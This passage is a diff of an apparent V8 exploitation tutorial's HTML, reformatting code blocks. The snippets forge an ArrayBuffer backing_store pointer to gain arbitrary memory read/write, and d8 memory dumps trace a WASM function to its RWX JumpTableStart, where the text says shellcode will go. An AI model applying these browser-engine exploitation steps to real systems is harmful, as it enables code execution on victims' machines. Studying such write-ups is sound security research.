+0x0000220f2ec82468    0x0000353622a005a9    ODDBALL_TYPE    
+----- [ FIXED_DOUBLE_ARRAY_TYPE : 0x18 ] -----
+0x0000220f2ec82470    0x0000353622a01451    MAP_TYPE    
+0x0000220f2ec82478    0x0000000100000000    
+0x0000220f2ec82480    0x3ff3333333333333    
+----- [ JS_ARRAY_BUFFER_TYPE : 0x40 ] -----
+0x0000220f2ec82488    0x0000261a446821b1    MAP_TYPE    
+0x0000220f2ec82490    0x0000353622a00c19    FIXED_ARRAY_TYPE    
+0x0000220f2ec82498    0x0000353622a00c19    FIXED_ARRAY_TYPE    
+0x0000220f2ec824a0    0x0000000000000100    
+0x0000220f2ec824a8    0x00005599e4b21f40    
+0x0000220f2ec824b0    0x0000000000000002    
+0x0000220f2ec824b8    0x0000000000000000    
+0x0000220f2ec824c0    0x0000000000000000    
+----- [ JS_ARRAY_TYPE : 0x20 ] -----
+0x0000220f2ec824c8    0x0000261a44682de1    MAP_TYPE    
+0x0000220f2ec824d0    0x0000353622a00c19    FIXED_ARRAY_TYPE    
+0x0000220f2ec824d8    0x0000220f2ec824e9    FIXED_ARRAY_TYPE    
+0x0000220f2ec824e0    0x0000000300000000    
+----- [ FIXED_ARRAY_TYPE : 0x28 ] -----
+0x0000220f2ec824e8    0x0000353622a007a9    MAP_TYPE    
+0x0000220f2ec824f0    0x0000000300000000    
+0x0000220f2ec824f8    0x0000001300000000    // MARK 1 for memory scanning
+0x0000220f2ec82500    0x00002f3befd86b81    JS_OBJECT_TYPE    
+0x0000220f2ec82508    0x0000003700000000    // MARK 2 for memory scanning
 </code></pre></div>
 
 
@@ -1487,17 +1487,17 @@ leaked 0x0000000300000000
 <h2 id="step-3-arbitrary-readwrite-primitive">Step 3 : Arbitrary read/write primitive</h2>
 <p>Going from step 2 to step 3 is fairly easy. We just need our <code>ArrayBuffer</code> to contain data that look like an actual object. More specifically, we would like to craft an <code>ArrayBuffer</code> with a controlled <code>backing_store</code> pointer. You can also directly corrupt the existing <code>ArrayBuffer</code> to make it point to arbitrary memory. Your call! </p>
 <p>Don't forget to choose a length that is big enough for the data you plan to write (most likely, your shellcode).</p>
-<div class="highlight"><pre><span></span><code>    <span class="kd">let</span> <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">evil_ab</span><span class="p">);</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">ARRAYBUFFER_SIZE</span> <span class="o">/</span> <span class="nx">PTR_SIZE</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
-      <span class="nx">view</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f2i</span><span class="p">(</span><span class="nx">arr2</span><span class="p">[</span><span class="nx">ab_len_idx</span><span class="o">-</span><span class="mi">3</span><span class="o">+</span><span class="nx">i</span><span class="p">]);</span>
-      <span class="k">if</span> <span class="p">(</span><span class="nx">view</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0x10000</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="nx">view</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="nx">n</span><span class="p">))</span>
-        <span class="nx">view</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x42424242</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// backing_store</span>
-    <span class="p">}</span>
-    <span class="c1">// [...]</span>
-    <span class="nx">arr2</span><span class="p">[</span><span class="nx">magic_mark_idx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">tagFloat</span><span class="p">(</span><span class="nx">fbackingstore_ptr</span><span class="p">);</span> <span class="c1">// object pointer</span>
-    <span class="c1">// [...]</span>
-    <span class="kd">let</span> <span class="nx">rw_view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">packed_elements_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-    <span class="nx">rw_view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span> <span class="c1">// *0x42424242 = 0x1337</span>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">evil_ab</span><span class="p">);</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">ARRAYBUFFER_SIZE</span> <span class="o">/</span> <span class="nx">PTR_SIZE</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">view</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f2i</span><span class="p">(</span><span class="nx">arr2</span><span class="p">[</span><span class="nx">ab_len_idx</span><span class="o">-</span><span class="mi">3</span><span class="o">+</span><span class="nx">i</span><span class="p">]);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">view</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0x10000</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="nx">view</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="nx">n</span><span class="p">))</span>
+    <span class="nx">view</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x42424242</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// backing_store</span>
+<span class="p">}</span>
+<span class="c1">// [...]</span>
+<span class="nx">arr2</span><span class="p">[</span><span class="nx">magic_mark_idx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">tagFloat</span><span class="p">(</span><span class="nx">fbackingstore_ptr</span><span class="p">);</span> <span class="c1">// object pointer</span>
+<span class="c1">// [...]</span>
+<span class="kd">let</span> <span class="nx">rw_view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">packed_elements_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="nx">rw_view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span> <span class="c1">// *0x42424242 = 0x1337</span>
 </code></pre></div>
 
 
@@ -1532,114 +1532,114 @@ Received signal 11 SEGV_MAPERR 000042424242
 4. Read the JumpTableStart field from the WASM instance</p>
 <p>As I mentioned above, I use a modified v8 engine for which I implemented a <code>%DumpObjects</code> feature that prints an annotated memory dump. It allows to very easily understand how to get from a WASM JS function to the <code>JumpTableStart</code> pointer. I put some code <a href="https://github.com/JeremyFetiveau/debugging-tools/tree/master/v8_doare-helpers">here</a> (Use  it at your own risks as it might crash sometimes). Also, depending on your current checkout, the code may not be compatible and you will probably need to tweak it.</p>
 <p><code>%DumpObjects</code> will pinpoint the pointer like this: </p>
-<div class="highlight"><pre><span></span><code><span class="o">-----</span> <span class="p">[</span> <span class="nl">WASM_INSTANCE_TYPE</span> <span class="p">:</span> <span class="mh">0x118</span> <span class="o">:</span> <span class="n">REFERENCES</span> <span class="n">RWX</span> <span class="n">MEMORY</span><span class="p">]</span> <span class="o">-----</span>
-<span class="p">[...]</span>
-<span class="mh">0x00002fac7911ec20</span>    <span class="mh">0x0000087e7c50a000</span>    <span class="n">JumpTableStart</span> <span class="p">[</span><span class="n">RWX</span><span class="p">]</span>
+<div class="highlight"><pre><span></span><code>----- [ WASM_INSTANCE_TYPE : 0x118 : REFERENCES RWX MEMORY] -----
+[...]
+0x00002fac7911ec20    0x0000087e7c50a000    JumpTableStart [RWX]
 </code></pre></div>
 
 
 <p>So let's just find the RWX memory from a WASM function.</p>
 <p><code>sample_wasm.js</code> can be found <a href="https://github.com/JeremyFetiveau/debugging-tools/blob/master/v8_doare-helpers/samples/sample_wasm.js">here</a>. </p>
-<div class="highlight"><pre><span></span><code><span class="n">d8</span><span class="o">&gt;</span> <span class="n">load</span><span class="p">(</span><span class="s">&quot;sample_wasm.js&quot;</span><span class="p">)</span>
-<span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DumpObjects</span><span class="p">(</span><span class="n">global_test</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span>
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">JS_FUNCTION_TYPE</span> <span class="p">:</span> <span class="mh">0x38</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911ed10</span>    <span class="mh">0x00001024ebc84191</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911ed18</span>    <span class="mh">0x00000cdfc0080c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x00002fac7911ed20</span>    <span class="mh">0x00000cdfc0080c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x00002fac7911ed28</span>    <span class="mh">0x00002fac7911ecd9</span>    <span class="n">SHARED_FUNCTION_INFO_TYPE</span>    
-<span class="mh">0x00002fac7911ed30</span>    <span class="mh">0x00002fac79101741</span>    <span class="n">NATIVE_CONTEXT_TYPE</span>    
-<span class="mh">0x00002fac7911ed38</span>    <span class="mh">0x00000d1caca00691</span>    <span class="n">FEEDBACK_CELL_TYPE</span>    
-<span class="mh">0x00002fac7911ed40</span>    <span class="mh">0x00002dc28a002001</span>    <span class="n">CODE_TYPE</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">TRANSITION_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x30</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911ed48</span>    <span class="mh">0x00000cdfc0080b69</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911ed50</span>    <span class="mh">0x0000000400000000</span>    
-<span class="mh">0x00002fac7911ed58</span>    <span class="mh">0x0000000000000000</span>    
-<span class="n">function</span> <span class="mi">1</span><span class="p">()</span> <span class="p">{</span> <span class="p">[</span><span class="n">native</span> <span class="n">code</span><span class="p">]</span> <span class="p">}</span>
+<div class="highlight"><pre><span></span><code>d8&gt; load(&quot;sample_wasm.js&quot;)
+d8&gt; %DumpObjects(global_test,10)
+----- [ JS_FUNCTION_TYPE : 0x38 ] -----
+0x00002fac7911ed10    0x00001024ebc84191    MAP_TYPE    
+0x00002fac7911ed18    0x00000cdfc0080c19    FIXED_ARRAY_TYPE    
+0x00002fac7911ed20    0x00000cdfc0080c19    FIXED_ARRAY_TYPE    
+0x00002fac7911ed28    0x00002fac7911ecd9    SHARED_FUNCTION_INFO_TYPE    
+0x00002fac7911ed30    0x00002fac79101741    NATIVE_CONTEXT_TYPE    
+0x00002fac7911ed38    0x00000d1caca00691    FEEDBACK_CELL_TYPE    
+0x00002fac7911ed40    0x00002dc28a002001    CODE_TYPE    
+----- [ TRANSITION_ARRAY_TYPE : 0x30 ] -----
+0x00002fac7911ed48    0x00000cdfc0080b69    MAP_TYPE    
+0x00002fac7911ed50    0x0000000400000000    
+0x00002fac7911ed58    0x0000000000000000    
+function 1() { [native code] }
 </code></pre></div>
 
 
-<div class="highlight"><pre><span></span><code><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DumpObjects</span><span class="p">(</span><span class="mh">0x00002fac7911ecd9</span><span class="p">,</span><span class="mi">11</span><span class="p">)</span>
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">SHARED_FUNCTION_INFO_TYPE</span> <span class="p">:</span> <span class="mh">0x38</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911ecd8</span>    <span class="mh">0x00000cdfc0080989</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911ece0</span>    <span class="mh">0x00002fac7911ecb1</span>    <span class="n">WASM_EXPORTED_FUNCTION_DATA_TYPE</span>    
-<span class="mh">0x00002fac7911ece8</span>    <span class="mh">0x00000cdfc00842c1</span>    <span class="n">ONE_BYTE_INTERNALIZED_STRING_TYPE</span>    
-<span class="mh">0x00002fac7911ecf0</span>    <span class="mh">0x00000cdfc0082ad1</span>    <span class="n">FEEDBACK_METADATA_TYPE</span>    
-<span class="mh">0x00002fac7911ecf8</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911ed00</span>    <span class="mh">0x000000000000004f</span>    
-<span class="mh">0x00002fac7911ed08</span>    <span class="mh">0x000000000000ff00</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">JS_FUNCTION_TYPE</span> <span class="p">:</span> <span class="mh">0x38</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911ed10</span>    <span class="mh">0x00001024ebc84191</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911ed18</span>    <span class="mh">0x00000cdfc0080c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x00002fac7911ed20</span>    <span class="mh">0x00000cdfc0080c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x00002fac7911ed28</span>    <span class="mh">0x00002fac7911ecd9</span>    <span class="n">SHARED_FUNCTION_INFO_TYPE</span>    
-<span class="mi">52417812098265</span>
+<div class="highlight"><pre><span></span><code>d8&gt; %DumpObjects(0x00002fac7911ecd9,11)
+----- [ SHARED_FUNCTION_INFO_TYPE : 0x38 ] -----
+0x00002fac7911ecd8    0x00000cdfc0080989    MAP_TYPE    
+0x00002fac7911ece0    0x00002fac7911ecb1    WASM_EXPORTED_FUNCTION_DATA_TYPE    
+0x00002fac7911ece8    0x00000cdfc00842c1    ONE_BYTE_INTERNALIZED_STRING_TYPE    
+0x00002fac7911ecf0    0x00000cdfc0082ad1    FEEDBACK_METADATA_TYPE    
+0x00002fac7911ecf8    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911ed00    0x000000000000004f    
+0x00002fac7911ed08    0x000000000000ff00    
+----- [ JS_FUNCTION_TYPE : 0x38 ] -----
+0x00002fac7911ed10    0x00001024ebc84191    MAP_TYPE    
+0x00002fac7911ed18    0x00000cdfc0080c19    FIXED_ARRAY_TYPE    
+0x00002fac7911ed20    0x00000cdfc0080c19    FIXED_ARRAY_TYPE    
+0x00002fac7911ed28    0x00002fac7911ecd9    SHARED_FUNCTION_INFO_TYPE    
+52417812098265
 </code></pre></div>
 
 
-<div class="highlight"><pre><span></span><code><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DumpObjects</span><span class="p">(</span><span class="mh">0x00002fac7911ecb1</span><span class="p">,</span><span class="mi">11</span><span class="p">)</span>
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">WASM_EXPORTED_FUNCTION_DATA_TYPE</span> <span class="p">:</span> <span class="mh">0x28</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911ecb0</span>    <span class="mh">0x00000cdfc00857a9</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911ecb8</span>    <span class="mh">0x00002dc28a002001</span>    <span class="n">CODE_TYPE</span>    
-<span class="mh">0x00002fac7911ecc0</span>    <span class="mh">0x00002fac7911eb29</span>    <span class="n">WASM_INSTANCE_TYPE</span>    
-<span class="mh">0x00002fac7911ecc8</span>    <span class="mh">0x0000000000000000</span>    
-<span class="mh">0x00002fac7911ecd0</span>    <span class="mh">0x0000000100000000</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">SHARED_FUNCTION_INFO_TYPE</span> <span class="p">:</span> <span class="mh">0x38</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911ecd8</span>    <span class="mh">0x00000cdfc0080989</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911ece0</span>    <span class="mh">0x00002fac7911ecb1</span>    <span class="n">WASM_EXPORTED_FUNCTION_DATA_TYPE</span>    
-<span class="mh">0x00002fac7911ece8</span>    <span class="mh">0x00000cdfc00842c1</span>    <span class="n">ONE_BYTE_INTERNALIZED_STRING_TYPE</span>    
-<span class="mh">0x00002fac7911ecf0</span>    <span class="mh">0x00000cdfc0082ad1</span>    <span class="n">FEEDBACK_METADATA_TYPE</span>    
-<span class="mh">0x00002fac7911ecf8</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911ed00</span>    <span class="mh">0x000000000000004f</span>    
-<span class="mi">52417812098225</span>
+<div class="highlight"><pre><span></span><code>d8&gt; %DumpObjects(0x00002fac7911ecb1,11)
+----- [ WASM_EXPORTED_FUNCTION_DATA_TYPE : 0x28 ] -----
+0x00002fac7911ecb0    0x00000cdfc00857a9    MAP_TYPE    
+0x00002fac7911ecb8    0x00002dc28a002001    CODE_TYPE    
+0x00002fac7911ecc0    0x00002fac7911eb29    WASM_INSTANCE_TYPE    
+0x00002fac7911ecc8    0x0000000000000000    
+0x00002fac7911ecd0    0x0000000100000000    
+----- [ SHARED_FUNCTION_INFO_TYPE : 0x38 ] -----
+0x00002fac7911ecd8    0x00000cdfc0080989    MAP_TYPE    
+0x00002fac7911ece0    0x00002fac7911ecb1    WASM_EXPORTED_FUNCTION_DATA_TYPE    
+0x00002fac7911ece8    0x00000cdfc00842c1    ONE_BYTE_INTERNALIZED_STRING_TYPE    
+0x00002fac7911ecf0    0x00000cdfc0082ad1    FEEDBACK_METADATA_TYPE    
+0x00002fac7911ecf8    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911ed00    0x000000000000004f    
+52417812098225
 </code></pre></div>
 
 
-<div class="highlight"><pre><span></span><code><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DumpObjects</span><span class="p">(</span><span class="mh">0x00002fac7911eb29</span><span class="p">,</span><span class="mi">41</span><span class="p">)</span>
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">WASM_INSTANCE_TYPE</span> <span class="p">:</span> <span class="mh">0x118</span> <span class="o">:</span> <span class="n">REFERENCES</span> <span class="n">RWX</span> <span class="n">MEMORY</span><span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911eb28</span>    <span class="mh">0x00001024ebc89411</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911eb30</span>    <span class="mh">0x00000cdfc0080c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x00002fac7911eb38</span>    <span class="mh">0x00000cdfc0080c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x00002fac7911eb40</span>    <span class="mh">0x00002073d820bac1</span>    <span class="n">WASM_MODULE_TYPE</span>    
-<span class="mh">0x00002fac7911eb48</span>    <span class="mh">0x00002073d820bcf1</span>    <span class="n">JS_OBJECT_TYPE</span>    
-<span class="mh">0x00002fac7911eb50</span>    <span class="mh">0x00002fac79101741</span>    <span class="n">NATIVE_CONTEXT_TYPE</span>    
-<span class="mh">0x00002fac7911eb58</span>    <span class="mh">0x00002fac7911ec59</span>    <span class="n">WASM_MEMORY_TYPE</span>    
-<span class="mh">0x00002fac7911eb60</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911eb68</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911eb70</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911eb78</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911eb80</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911eb88</span>    <span class="mh">0x00002073d820bc79</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x00002fac7911eb90</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911eb98</span>    <span class="mh">0x00002073d820bc69</span>    <span class="n">FOREIGN_TYPE</span>    
-<span class="mh">0x00002fac7911eba0</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911eba8</span>    <span class="mh">0x00000cdfc00804c9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911ebb0</span>    <span class="mh">0x00000cdfc00801d1</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="mh">0x00002fac7911ebb8</span>    <span class="mh">0x00002dc289f94d21</span>    <span class="n">CODE_TYPE</span>    
-<span class="mh">0x00002fac7911ebc0</span>    <span class="mh">0x0000000000000000</span>    
-<span class="mh">0x00002fac7911ebc8</span>    <span class="mh">0x00007f9f9cf60000</span>    
-<span class="mh">0x00002fac7911ebd0</span>    <span class="mh">0x0000000000010000</span>    
-<span class="mh">0x00002fac7911ebd8</span>    <span class="mh">0x000000000000ffff</span>    
-<span class="mh">0x00002fac7911ebe0</span>    <span class="mh">0x0000556b3a3e0c00</span>    
-<span class="mh">0x00002fac7911ebe8</span>    <span class="mh">0x0000556b3a3ea630</span>    
-<span class="mh">0x00002fac7911ebf0</span>    <span class="mh">0x0000556b3a3ea620</span>    
-<span class="mh">0x00002fac7911ebf8</span>    <span class="mh">0x0000556b3a47c210</span>    
-<span class="mh">0x00002fac7911ec00</span>    <span class="mh">0x0000000000000000</span>    
-<span class="mh">0x00002fac7911ec08</span>    <span class="mh">0x0000556b3a47c230</span>    
-<span class="mh">0x00002fac7911ec10</span>    <span class="mh">0x0000000000000000</span>    
-<span class="mh">0x00002fac7911ec18</span>    <span class="mh">0x0000000000000000</span>    
-<span class="mh">0x00002fac7911ec20</span>    <span class="mh">0x0000087e7c50a000</span>    <span class="n">JumpTableStart</span> <span class="p">[</span><span class="n">RWX</span><span class="p">]</span>
-<span class="mh">0x00002fac7911ec28</span>    <span class="mh">0x0000556b3a47c250</span>    
-<span class="mh">0x00002fac7911ec30</span>    <span class="mh">0x0000556b3a47afa0</span>    
-<span class="mh">0x00002fac7911ec38</span>    <span class="mh">0x0000556b3a47afc0</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">TUPLE2_TYPE</span> <span class="p">:</span> <span class="mh">0x18</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911ec40</span>    <span class="mh">0x00000cdfc00827c9</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911ec48</span>    <span class="mh">0x00002fac7911eb29</span>    <span class="n">WASM_INSTANCE_TYPE</span>    
-<span class="mh">0x00002fac7911ec50</span>    <span class="mh">0x00002073d820b849</span>    <span class="n">JS_FUNCTION_TYPE</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">WASM_MEMORY_TYPE</span> <span class="p">:</span> <span class="mh">0x30</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002fac7911ec58</span>    <span class="mh">0x00001024ebc89e11</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002fac7911ec60</span>    <span class="mh">0x00000cdfc0080c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x00002fac7911ec68</span>    <span class="mh">0x00000cdfc0080c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mi">52417812097833</span>
+<div class="highlight"><pre><span></span><code>d8&gt; %DumpObjects(0x00002fac7911eb29,41)
+----- [ WASM_INSTANCE_TYPE : 0x118 : REFERENCES RWX MEMORY] -----
+0x00002fac7911eb28    0x00001024ebc89411    MAP_TYPE    
+0x00002fac7911eb30    0x00000cdfc0080c19    FIXED_ARRAY_TYPE    
+0x00002fac7911eb38    0x00000cdfc0080c19    FIXED_ARRAY_TYPE    
+0x00002fac7911eb40    0x00002073d820bac1    WASM_MODULE_TYPE    
+0x00002fac7911eb48    0x00002073d820bcf1    JS_OBJECT_TYPE    
+0x00002fac7911eb50    0x00002fac79101741    NATIVE_CONTEXT_TYPE    
+0x00002fac7911eb58    0x00002fac7911ec59    WASM_MEMORY_TYPE    
+0x00002fac7911eb60    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911eb68    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911eb70    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911eb78    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911eb80    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911eb88    0x00002073d820bc79    FIXED_ARRAY_TYPE    
+0x00002fac7911eb90    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911eb98    0x00002073d820bc69    FOREIGN_TYPE    
+0x00002fac7911eba0    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911eba8    0x00000cdfc00804c9    ODDBALL_TYPE    
+0x00002fac7911ebb0    0x00000cdfc00801d1    ODDBALL_TYPE    
+0x00002fac7911ebb8    0x00002dc289f94d21    CODE_TYPE    
+0x00002fac7911ebc0    0x0000000000000000    
+0x00002fac7911ebc8    0x00007f9f9cf60000    
+0x00002fac7911ebd0    0x0000000000010000    
+0x00002fac7911ebd8    0x000000000000ffff    
+0x00002fac7911ebe0    0x0000556b3a3e0c00    
+0x00002fac7911ebe8    0x0000556b3a3ea630    
+0x00002fac7911ebf0    0x0000556b3a3ea620    
+0x00002fac7911ebf8    0x0000556b3a47c210    
+0x00002fac7911ec00    0x0000000000000000    
+0x00002fac7911ec08    0x0000556b3a47c230    
+0x00002fac7911ec10    0x0000000000000000    
+0x00002fac7911ec18    0x0000000000000000    
+0x00002fac7911ec20    0x0000087e7c50a000    JumpTableStart [RWX]
+0x00002fac7911ec28    0x0000556b3a47c250    
+0x00002fac7911ec30    0x0000556b3a47afa0    
+0x00002fac7911ec38    0x0000556b3a47afc0    
+----- [ TUPLE2_TYPE : 0x18 ] -----
+0x00002fac7911ec40    0x00000cdfc00827c9    MAP_TYPE    
+0x00002fac7911ec48    0x00002fac7911eb29    WASM_INSTANCE_TYPE    
+0x00002fac7911ec50    0x00002073d820b849    JS_FUNCTION_TYPE    
+----- [ WASM_MEMORY_TYPE : 0x30 ] -----
+0x00002fac7911ec58    0x00001024ebc89e11    MAP_TYPE    
+0x00002fac7911ec60    0x00000cdfc0080c19    FIXED_ARRAY_TYPE    
+0x00002fac7911ec68    0x00000cdfc0080c19    FIXED_ARRAY_TYPE    
+52417812097833
 </code></pre></div>
 
 
